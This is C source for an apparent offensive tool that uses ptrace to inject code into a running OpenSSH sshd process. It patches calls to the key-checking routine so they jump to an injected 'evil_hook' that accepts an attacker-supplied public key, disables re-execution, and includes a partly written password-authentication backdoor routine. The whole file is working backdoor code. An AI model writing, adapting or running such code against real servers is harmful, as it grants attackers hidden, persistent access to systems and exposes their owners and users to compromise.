#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <types.h>
#include <common.h>
#include <map.h>
#include <inject.h>
#include <sig.h>
#include <ptrace.h>
#include <callcache.h>
#include <util.h>
#include <elflib.h>

extern u8 *evil_hook;
extern u64 evil_hook_size;

u8 *dynsym, *dynstr;
int dynsym_sz, dynstr_sz;

u8 *symtab, *strtab;
int symtab_sz, strtab_sz;

u64 resolve_symbol_tab(inject_ctx *ctx, char *name) {
	u64 sym;

	if (dynsym != 0 && dynstr != 0) {
		sym = resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, name);
	}

	if (sym == 0 && symtab != 0 && strtab != 0) {
		sym = resolve_symbol(symtab, symtab_sz, (char*)strtab, name);
	}

	if (sym != 0) {
		sym += ctx->elf_base;
	}

	return sym;
}


void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
	signature signatures[]={
		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
	};

	u8 *evil_bin;
	int i, j;
	u32 callcache_total, num_key_allowed2_calls=0;
	char line[255];
	callcache_entry *callcache, *entry;
	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
	u64 diff=0, hole_addr=0;
	mem_mapping *m1, *m2;

	evil_bin = malloc(evil_hook_size);
	memcpy(evil_bin, evil_hook, evil_hook_size);

	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
		if (signatures[i].addr == 0) {
			error("%s not found :(\n", signatures[i].name);
		}

		sprintf(line, 
			"%s\t\t= \x1b[37m0x%lx",
			signatures[i].name, signatures[i].addr
		);

		for(j = 0; j < evil_hook_size - 8; j++) {
			u64 *vptr = (u64*)&evil_bin[j];
			if (*vptr == signatures[i].placeholder) {
				sprintf(
					line+strlen(line), 
					" .. [%lx] at offset %x in evil_bin!", 
					signatures[i].placeholder, j
				);

				*vptr = signatures[i].addr;
				break;
			}
		}
		info(line);
	}

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == signatures[0].addr) {
			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
			num_key_allowed2_calls++;
		}
	}

	if (num_key_allowed2_calls == 0)
		error("no call to user_key_allowed2 found :(");

	// find a neighborly memoryhole where we can mmap
	for(i=0; i < ctx->num_maps; i++) {
		m1 = ctx->mappings[i];
		m2 = ctx->mappings[i+1];

		if(
			user_key_allowed2_calls[0] >= m1->start &&
			m2->start > (m1->end + 0x1000)
		) {
			hole_addr = m1->end;

			break;
		}
	}
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	info2("entering critical phase");

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	for(i=0; i<num_key_allowed2_calls; i++) {
		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;

		info(
			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
			user_key_allowed2_calls[i], hole_addr,
			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
		);

		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
	}

	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
	_poke(ctx->pid, hole_addr+(evil_hook_size), pubkey, strlen(pubkey));
	info("poked evil_bin to 0x%lx.", hole_addr);
	
}

void password_backdoor(inject_ctx *ctx) {
	u8 privsep_jnz[2]={0,0};

	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
	u64 auth_password=0, mm_auth_password=0;

	use_privsep = resolve_symbol_tab(ctx, "use_privsep");

	if (use_privsep == 0) {
		error("could not locate use_privsep :(");
	}

	info("found use_privsep\t\t= 0x%llx", use_privsep);

	logit_passchange = lea_by_debugstr(
		ctx, LEA_RDI, "password change not supported"
	);

	info("logit(\"password change..\") = 0x%llx", logit_passchange);

	privsep_lea = find_prev_lea(ctx, LEA_RAX, logit_passchange, use_privsep);
	info("lea rax, privsep\t\t= 0x%llx", privsep_lea);

	privsep_test = find_next_opcode(ctx, privsep_lea, (u8*)"\x85\xc0", 2);
	info("privsep test\t\t= 0x%llx", privsep_test);

	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);

	if (privsep_jnz[0] != 0x75) {
		error("wtf du0d.. the next insn is not a jnz.. wtf..");
		exit(-1);
	}

	auth_password = resolve_call_insn(ctx, privsep_test+4);
	info("auth_password\t\t= 0x%llx", auth_password);

	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
}

int main(int argc, char *argv[]) {
	char sshd_path[255], proc_exe[64];

	u32 nullw=0;
	u64 rexec_flag = 0;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
		return -1;
	}

	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	ctx->pid = atoi(argv[1]);

	_attach(ctx->pid);
	info("slurping stuff to memory..");
	map_init();
	ctx->num_maps = map_load_all(ctx);
	info("loaded %d memory mappings", ctx->num_maps);

	ctx->mappings = get_mappings();

	sort_maps(ctx);

	memset(sshd_path, 0, 255);
	sprintf(proc_exe, "/proc/%d/exe", atoi(argv[1]));
	readlink(proc_exe, sshd_path, 255);

	info("sshd binary path = '%s'", sshd_path);

	// locate syscall instruction
	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t= \x1b[37m0x%lx", ctx->sc_addr);

	// load symtabs
	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym);
	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr);

	symtab_sz = get_section(sshd_path, ".symtab", &symtab);
	strtab_sz = get_section(sshd_path, ".strtab", &strtab);

	// find rexec_flag
	rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");

	if (rexec_flag == 0) {
		error("could not resolve rexec_flag :(");
	}

	info("rexec_flag\t\t= 0x%lx", rexec_flag); 

	cache_calltable(ctx);

	//password_backdoor(ctx);
	pubkey_backdoor(ctx, argv[2]);

	info("switching off rexec..");
	_poke(ctx->pid, rexec_flag, &nullw, 4);

	_detach(ctx->pid);
	info("detached.\n");
	free(ctx);
	return 0;
}
